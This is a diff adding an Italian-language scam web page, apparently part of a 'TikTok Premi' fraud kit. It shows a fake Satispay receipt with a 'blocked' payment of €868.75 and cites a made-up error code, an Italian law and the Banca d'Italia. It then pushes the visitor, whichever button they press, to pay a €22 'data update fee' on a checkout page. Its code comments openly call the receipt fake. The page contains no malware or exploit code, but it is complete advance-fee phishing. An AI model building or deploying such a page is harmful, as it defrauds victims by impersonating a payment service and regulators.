@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Errore Transazione – TikTok Premi</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet"/>
+<style>
+:root{--primary:hsl(346,97%,55%);--bg:#f5f5f7;--fg:#111;--muted:#6b7280;--border:#e5e7eb;--green:#00b37e}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Poppins',sans-serif;background:var(--bg);color:var(--fg);min-height:100vh;display:flex;flex-direction:column;align-items:center;-webkit-font-smoothing:antialiased}
+@keyframes fadeUp{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:translateY(0)}}
+@keyframes pulse-ring{0%{box-shadow:0 0 0 0 hsl(346 97% 55%/.4)}70%{box-shadow:0 0 0 14px hsl(346 97% 55%/0)}100%{box-shadow:0 0 0 0 hsl(346 97% 55%/0)}}
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.4}}
+.fu{animation:fadeUp .4s ease both}
+.d1{animation-delay:.05s}.d2{animation-delay:.12s}.d3{animation-delay:.18s}.d4{animation-delay:.24s}.d5{animation-delay:.3s}.d6{animation-delay:.36s}.d7{animation-delay:.42s}
+.wrap{width:100%;max-width:520px;padding-bottom:60px}
+
+/* Topbar erro */
+.error-bar{width:100%;max-width:520px;background:#e63946;color:#fff;text-align:center;padding:11px 16px;font-size:12px;font-weight:700;display:flex;align-items:center;justify-content:center;gap:8px}
+.error-dot{width:8px;height:8px;border-radius:50%;background:#fff;animation:blink .8s ease infinite;flex-shrink:0}
+
+.section{padding:14px}
+
+/* Recibo falso Satispay */
+.receipt-card{background:#fff;border-radius:16px;box-shadow:0 2px 20px rgba(0,0,0,.1);overflow:hidden;margin-bottom:12px}
+.receipt-header{background:#e3002e;color:#fff;padding:16px 18px;text-align:center}
+.rh-logo{font-size:13px;font-weight:800;letter-spacing:1px;text-transform:uppercase;opacity:.85;margin-bottom:6px}
+.rh-title{font-size:18px;font-weight:900}
+.receipt-body{padding:18px}
+.receipt-row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid var(--border);font-size:13.5px}
+.receipt-row:last-child{border-bottom:none}
+.rr-label{color:var(--muted)}
+.rr-val{font-weight:700;color:var(--fg)}
+.rr-val.green{color:var(--green)}
+.amount-big{text-align:center;padding:18px 0 14px;border-bottom:1px solid var(--border);margin-bottom:14px}
+.ab-label{font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:6px}
+.ab-amount{font-size:46px;font-weight:900;color:var(--fg);font-variant-numeric:tabular-nums;letter-spacing:-1px}
+
+/* Caixa de erro */
+.error-card{background:#fff4f4;border:1.5px solid #fca5a5;border-radius:14px;padding:18px;margin-bottom:12px}
+.ec-header{display:flex;align-items:center;gap:10px;margin-bottom:12px}
+.ec-icon{width:40px;height:40px;border-radius:50%;background:#fee2e2;display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0}
+.ec-title{font-size:15px;font-weight:800;color:#991b1b}
+.ec-code{font-size:11px;color:#b91c1c;font-weight:600;margin-top:2px}
+.ec-desc{font-size:13px;color:#7f1d1d;line-height:1.6;margin-bottom:14px}
+.ec-desc strong{color:#991b1b}
+.resolution-box{background:#fff;border:1px solid #fca5a5;border-radius:10px;padding:14px}
+.rb-label{font-size:12px;font-weight:800;color:#991b1b;margin-bottom:8px;text-transform:uppercase;letter-spacing:.05em}
+.rb-row{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #fecaca;font-size:13px}
+.rb-row:last-child{border-bottom:none;padding-bottom:0}
+.rb-label2{color:#7f1d1d}
+.rb-val{font-weight:700;color:#991b1b}
+
+.btn-yes{display:flex;width:100%;padding:16px;background:var(--green);color:#fff;border:none;border-radius:12px;font-size:16px;font-weight:800;font-family:'Poppins',sans-serif;cursor:pointer;align-items:center;justify-content:center;gap:10px;text-transform:uppercase;letter-spacing:.5px;box-shadow:0 12px 32px rgba(0,179,126,.28);animation:pulse-ring 2.5s ease infinite;transition:opacity .15s;margin-bottom:10px}
+.btn-yes.loading{opacity:.75;pointer-events:none}
+.spinner{display:none;width:18px;height:18px;border:2.5px solid rgba(255,255,255,.35);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;flex-shrink:0}
+.btn-yes.loading .spinner{display:block}
+.btn-no{width:100%;padding:14px;background:transparent;border:1.5px solid var(--border);border-radius:12px;font-size:14px;font-weight:600;font-family:'Poppins',sans-serif;cursor:pointer;color:var(--muted);margin-bottom:10px;transition:border-color .15s}
+.btn-no:hover{border-color:var(--primary);color:var(--primary)}
+.btn-conclude{display:flex;width:100%;padding:16px;background:var(--primary);color:#fff;border:none;border-radius:12px;font-size:15px;font-weight:800;font-family:'Poppins',sans-serif;cursor:pointer;align-items:center;justify-content:center;gap:10px;text-transform:uppercase;letter-spacing:.5px;box-shadow:0 12px 32px hsl(346 97% 55%/.28);transition:opacity .15s}
+.btn-conclude.loading{opacity:.75;pointer-events:none}
+.secure-row{display:flex;justify-content:center;gap:14px;padding-top:10px;flex-wrap:wrap}
+.sr-item{font-size:11px;color:var(--muted);font-weight:600}
+
+.recipient-box{background:#f0fdf4;border:1px solid #bbf7d0;border-radius:10px;padding:12px 14px;margin-bottom:14px;font-size:13px}
+.rb2-label{font-size:11px;color:#166534;text-transform:uppercase;font-weight:700;letter-spacing:.05em;margin-bottom:5px}
+.rb2-name{font-size:15px;font-weight:800;color:#14532d}
+.rb2-warn{font-size:11.5px;color:#166534;margin-top:3px}
+</style>
+</head>
+<body>
+<div class="error-bar fu d1">
+  <div class="error-dot"></div>
+  <span>⚠️ ERRORE — Divergenza dati nel pagamento</span>
+  <div class="error-dot"></div>
+</div>
+
+<div class="wrap">
+  <div class="section">
+
+    <!-- Recibo falso -->
+    <div class="receipt-card fu d2">
+      <div class="receipt-header">
+        <p class="rh-logo">🔴 Satispay</p>
+        <p class="rh-title">Pagamento Inviato</p>
+      </div>
+      <div class="receipt-body">
+        <div class="amount-big">
+          <p class="ab-label">Importo inviato</p>
+          <div class="ab-amount" id="receiptAmt">€868,75</div>
+        </div>
+        <div class="receipt-row"><span class="rr-label">Destinatario</span><span class="rr-val" id="recipientName">Maria Giuseppina Sorrentino</span></div>
+        <div class="receipt-row"><span class="rr-label">Data</span><span class="rr-val" id="receiptDate">—</span></div>
+        <div class="receipt-row"><span class="rr-label">Stato</span><span class="rr-val" style="color:#e63946">⚠️ BLOCCATO</span></div>
+        <div class="receipt-row"><span class="rr-label">Protocollo</span><span class="rr-val" id="receiptProt">—</span></div>
+      </div>
+    </div>
+
+    <!-- Destinatário -->
+    <div class="recipient-box fu d3">
+      <p class="rb2-label">Verifica destinatario</p>
+      <p class="rb2-name">👤 Maria Giuseppina Sorrentino</p>
+      <p class="rb2-warn">⚠️ Questo è il tuo account? Se non lo riconosci, agisci subito.</p>
+    </div>
+
+    <!-- Erro -->
+    <div class="error-card fu d4">
+      <div class="ec-header">
+        <div class="ec-icon">🚫</div>
+        <div>
+          <div class="ec-title">ERRORE: DIVERGENZA DATI</div>
+          <div class="ec-code">Codice errore: SAT-4423-IT · Art. 6 d.lgs 231/2007</div>
+        </div>
+      </div>
+      <p class="ec-desc">Il sistema ha rilevato una <strong>divergenza nei dati del destinatario</strong>. Per sicurezza il pagamento è stato bloccato temporaneamente. Per completare l'operazione è necessaria una tassa di <strong>aggiornamento dati di €22,00</strong> conforme al regolamento Banca d'Italia.</p>
+      <div class="resolution-box">
+        <p class="rb-label">Risoluzione urgente</p>
+        <div class="rb-row"><span class="rb-label2">Importo bloccato</span><span class="rb-val" id="blockedAmt">€868,75</span></div>
+        <div class="rb-row"><span class="rb-label2">Tassa aggiornamento dati</span><span class="rb-val">€22,00</span></div>
+        <div class="rb-row"><span class="rb-label2">Dopo risoluzione ricevi</span><span class="rb-val" id="afterAmt">€868,75</span></div>
+      </div>
+    </div>
+
+    <!-- CTAs -->
+    <div class="fu d5">
+      <button class="btn-yes" id="btnYes">
+        <div class="spinner"></div>
+        <span class="btn-text">✅ Sì, questo Satispay è mio — Sblocca</span>
+      </button>
+      <button class="btn-no" id="btnNo">❌ NON È IL MIO PAGAMENTO</button>
+      <button class="btn-conclude" id="btnConclude" style="display:none">
+        <div class="spinner"></div>
+        <span class="btn-text">🔒 Concludi con Sicurezza — Paga €22,00</span>
+      </button>
+      <div class="secure-row">
+        <span class="sr-item">🔒 SSL</span>
+        <span class="sr-item">✅ Satispay</span>
+        <span class="sr-item">🏛️ Banca d'Italia</span>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<script>
+(function(){
+  var params  = new URLSearchParams(window.location.search);
+  var total   = parseFloat(params.get('total')) || 868.75;
+  var taxa    = 22.00;
+  function fmt(v){ return '€' + v.toFixed(2).replace('.',','); }
+
+  document.getElementById('receiptAmt').textContent = fmt(total);
+  document.getElementById('blockedAmt').textContent = fmt(total);
+  document.getElementById('afterAmt').textContent   = fmt(total);
+
+  var now = new Date();
+  document.getElementById('receiptDate').textContent =
+    String(now.getDate()).padStart(2,'0') + '/' +
+    String(now.getMonth()+1).padStart(2,'0') + '/' +
+    now.getFullYear() + ' ' +
+    String(now.getHours()).padStart(2,'0') + ':' +
+    String(now.getMinutes()).padStart(2,'0');
+  document.getElementById('receiptProt').textContent =
+    'SAT' + Math.floor(100000 + Math.random()*900000) + 'IT';
+
+  function goCheckout(){
+    var dest = new URL('checkout-buck.html', window.location.href);
+    params.forEach(function(v,k){ dest.searchParams.set(k,v); });
+    dest.searchParams.set('taxa', taxa.toFixed(2));
+    dest.searchParams.set('total', total.toFixed(2));
+    window.location.href = dest.toString();
+  }
+
+  document.getElementById('btnYes').addEventListener('click', function(){
+    var btn = this;
+    btn.classList.add('loading');
+    btn.querySelector('.btn-text').textContent = 'Verifica in corso…';
+    setTimeout(function(){
+      btn.classList.remove('loading');
+      btn.querySelector('.btn-text').textContent = '✅ Sì, questo Satispay è mio — Sblocca';
+      document.getElementById('btnConclude').style.display = 'flex';
+    }, 1200);
+  });
+
+  document.getElementById('btnNo').addEventListener('click', function(){
+    document.getElementById('btnConclude').style.display = 'flex';
+  });
+
+  document.getElementById('btnConclude').addEventListener('click', function(){
+    var btn = this;
+    btn.classList.add('loading');
+    btn.querySelector('.btn-text').textContent = 'Generazione pagamento…';
+    setTimeout(goCheckout, 900);
+  });
+})();
+</script>
+</body>
+</html>
